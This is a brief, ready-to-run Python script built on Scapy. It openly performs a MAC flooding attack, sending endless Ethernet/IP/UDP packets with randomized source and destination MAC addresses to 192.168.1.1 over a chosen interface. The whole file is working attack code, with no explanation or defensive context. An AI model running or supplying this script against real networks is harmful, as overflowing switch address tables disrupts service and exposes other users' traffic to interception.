from scapy.all import *
import random
import time

# Generate a random MAC address
def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
    )

# Interface to use (replace with yours)
interface = "eth0"  # or wlan0 if you're wireless and in monitor mode

# Packet flooding loop
def mac_flood():
    print("Starting MAC flooding attack...")
    try:
        while True:
            src_mac = random_mac()
            dst_mac = random_mac()  # Can also be fixed to ff:ff:ff:ff:ff:ff
            packet = Ether(src=src_mac, dst=dst_mac) / IP(dst="192.168.1.1") / UDP(sport=RandShort(), dport=RandShort())
            sendp(packet, iface=interface, verbose=False)
            time.sleep(0.01)  # Optional: slow down a bit
    except KeyboardInterrupt:
        print("\nAttack stopped.")

if __name__ == "__main__":
    mac_flood()
